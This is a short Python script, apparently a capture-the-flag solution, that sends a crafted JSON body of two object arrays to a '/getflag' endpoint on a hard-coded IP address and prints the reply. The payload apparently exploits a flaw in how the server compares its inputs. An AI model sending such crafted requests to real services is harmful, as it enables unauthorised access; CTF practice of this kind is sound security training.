#!/usr/bin/python3

import requests
import json

url = "http://88.198.219.20:42019/getflag"
body = {
	'one': [{'a':1}],
	'two': [{'a':2}]
}

#print(json.dumps(body))

r = requests.post(url, json=body)
print(r.text)